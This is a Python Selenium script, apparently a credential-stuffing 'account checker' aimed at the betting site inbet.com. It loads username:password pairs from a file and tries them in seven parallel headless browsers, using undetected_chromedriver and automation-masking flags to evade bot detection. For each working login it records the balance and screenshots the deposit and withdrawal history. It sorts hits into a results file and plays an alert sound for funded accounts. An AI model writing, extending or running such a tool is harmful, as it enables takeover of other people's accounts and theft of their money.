import winsound  # For playing sound on Windows
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard  # for detecting keypresses
from colorama import Fore, Style, init
import sys
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from datetime import datetime
import multiprocessing

wrongpass_file = r"C:\Users\petar\Desktop\inbet\wrongpass.txt"

init(autoreset=True)

stop_flag = False

def log(message, level="INFO", username=None, password=None):
    color = {
        "INFO": Fore.CYAN,
        "WARNING": Fore.YELLOW,
        "ERROR": Fore.RED,
        "SUCCESS": Fore.GREEN
    }.get(level, Fore.CYAN)

    prefix = f"[{username}:{password}] " if username and password else ""
    print(f"{color}{prefix}[{level}] {message}{Style.RESET_ALL}")

def emergency_stop_listener():
    global stop_flag
    buffer = []

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 'i':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                log("EMERGENCY STOP triggered! Exiting script.", "ERROR")
                stop_flag = True
                os._exit(0)

def sanitize_filename(text):
    return re.sub(r'[\\/:*?"<>|]', '_', text)

def safe_click(driver, element, username, password, retries=3):
    for attempt in range(1, retries + 1):
        try:
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.5)
            element.click()
            log(f"Click succeeded on attempt {attempt}.", "SUCCESS", username, password)
            return True
        except Exception as e:
            if attempt == retries:
                log(f"Click failed after {retries} attempts: {e}", "ERROR", username, password)
            else:
                log(f"Click intercepted on attempt {attempt}. Retrying...", "WARNING", username, password)
                try:
                    driver.execute_script("""
                        document.querySelectorAll(
                            '.modal, .modal-backdrop, .fade.show, .d-flex, .wh-100'
                        ).forEach(el => el.remove());
                    """)
                    log("Removed potential overlays.", "INFO", username, password)
                except Exception:
                    pass
                time.sleep(1)
    log("Could not click element after retries.", "ERROR", username, password)
    return False

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 142
    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)
    return driver

def login(credentials):
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 20)

        # Accept cookies
        try:
            xpath_btn = '/html/body/div[1]/div/div[4]/div[1]/div/div[2]/button[1]'
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.XPATH, xpath_btn))
            )
            try:
                wait.until(EC.element_to_be_clickable((By.XPATH, xpath_btn))).click()
            except Exception:
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            log("Cookies accepted.", "INFO", username, password)
        except Exception:
            try:
                css_qid = '[data-qid="accept-cookies"]'
                accept_cookies_btn = wait.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, css_qid))
                )
                try:
                    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, css_qid))).click()
                except Exception:
                    driver.execute_script("arguments[0].click();", accept_cookies_btn)
                log("Cookies accepted (fallback).", "INFO", username, password)
            except Exception:
                log("Accept Cookies button not found. Continuing...", "WARNING", username, password)
                # Open login window
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]"))
            )
            login_button.click()
            log("Login window opened.", "INFO", username, password)
        except Exception:
            log("Login button not found or not clickable.", "ERROR", username, password)
            return

        # Enter username
        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            log("Username entered.", "INFO", username, password)
        except Exception:
            log("Username field not found.", "ERROR", username, password)
            return

        # Enter password
        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            log("Password entered.", "INFO", username, password)
        except Exception:
            log("Password field not found.", "ERROR", username, password)
            return

        # Click login
        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            log("Login button clicked.", "INFO", username, password)
        except Exception:
            log("Submit button not clickable.", "ERROR", username, password)
            return

        formatted_amount = '0.00'
        balance_found = False

        # Step 6a: Extract Balance
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                    log(f"Balance found: {formatted_amount}", "SUCCESS", username, password)
                except ValueError:
                    log("Failed to parse balance as float.", "WARNING", username, password)
            else:
                log("Balance text present but no numeric amount found.", "WARNING", username, password)
        except Exception:
            log("Balance element NOT found. Skipping further actions.", "ERROR", username, password)

            # Save to wrongpass.txt
            wrongpass_file = r"C:\Users\petar\Desktop\inbet\wrongpass.txt"
            os.makedirs(os.path.dirname(wrongpass_file), exist_ok=True)
            with open(wrongpass_file, "a", encoding="utf-8") as f:
                f.write(f"{username}:{password}\n")

            driver.quit()
            return

        # Close popup if present
        try:
            close_btn = wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[@data-qid="gmf-modal-close"]'))
            )
            close_btn.click()
            log("Popup closed.", "INFO", username, password)
            time.sleep(1)
            try:
                driver.execute_script("""
                    const backdrops = document.querySelectorAll('.modal-backdrop');
                    backdrops.forEach(el => el.remove());
                """)
                log("Removed modal backdrop via JavaScript.", "INFO", username, password)
            except Exception as e:
                log(f"Failed to remove modal backdrop: {e}", "WARNING", username, password)
            time.sleep(1)
        except Exception:
            pass

        # Navigate to history
        try:
            history_url = "https://inbet.com/my-account/bank?tab=history"
            driver.get(history_url)
            log(f"Navigated to {history_url}", "INFO", username, password)
            time.sleep(3)
            try:
                driver.execute_script("""
                    const backdrops = document.querySelectorAll('.modal-backdrop');
                    backdrops.forEach(el => el.remove());
                """)
                log("Removed modal backdrop after navigating to history.", "INFO", username, password)
            except Exception as e:
                log(f"Failed to remove modal backdrop after navigating: {e}", "WARNING", username, password)
            time.sleep(1)
        except Exception as e:
            log(f"Failed to navigate to history page: {e}", "ERROR", username, password)

        # Take screenshot
        safe_name = sanitize_filename(f"{username}:{password}_history.png")
        driver.save_screenshot(safe_name)
        log(f"Screenshot saved as {safe_name}", "SUCCESS", username, password)

        # Click withdrawal history tab
        try:
            withdrawal_tab = wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[@data-qid="withdrawalHistoryTab"]'))
            )
            clicked = safe_click(driver, withdrawal_tab, username, password)
            if clicked:
                time.sleep(2)
                try:
                    driver.execute_script("""
                        const backdrops = document.querySelectorAll('.modal-backdrop');
                        backdrops.forEach(el => el.remove());
                    """)
                    log("Removed modal backdrop after clicking withdrawal history tab.", "INFO", username, password)
                except Exception as e:
                    log(f"Failed to remove modal backdrop after clicking withdrawal tab: {e}", "WARNING", username, password)

                safe_name_withdraw = sanitize_filename(f"{username}:{password}_withdraw_history.png")
                if driver.session_id is not None:
                    driver.save_screenshot(safe_name_withdraw)
                    log(f"Screenshot saved as {safe_name_withdraw}", "SUCCESS", username, password)
                else:
                    log("Cannot save screenshot: session closed.", "ERROR", username, password)
            else:
                log("Skipping withdrawal screenshot because click failed.", "ERROR", username, password)
        except Exception as e:
            log(f"Failed to click 'История на изплащанията' tab: {e}", "ERROR", username, password)

        # Sound if balance high
        balance_value = float(formatted_amount.replace(',', '.'))
        if balance_value > 0.99:
            try:
                winsound.PlaySound(
                    r"C:\Users\petar\Desktop\inbet\inbet.wav",
                    winsound.SND_FILENAME | winsound.SND_ASYNC
                )
                log("Sound played for high balance.", "SUCCESS", username, password)
            except:
                log("Could not play sound.", "WARNING", username, password)

        if balance_found:
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{username}:{password} - Balance: {formatted_amount}\n")

    except Exception as e:
        log(f"Unexpected error: {e}", "ERROR", username, password)
        traceback.print_exc()
    finally:
        driver.quit()

def main():
    global login_page_url, success_logins_file, stop_flag

    credentials_file = 'uniquecredentials.txt'
    success_logins_file = r"C:\\Users\\petar\\Desktop\\inbet\\PatrickAIPlatinum.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://inbet.com/sports"
    credentials = read_credentials(credentials_file)

    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    max_workers = 7
    #max_workers = min(multiprocessing.cpu_count(), len(credentials))
    print(f"[INFO] Starting with {max_workers} workers...")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(lambda cred: login(cred), credentials)

if __name__ == "__main__":
    main()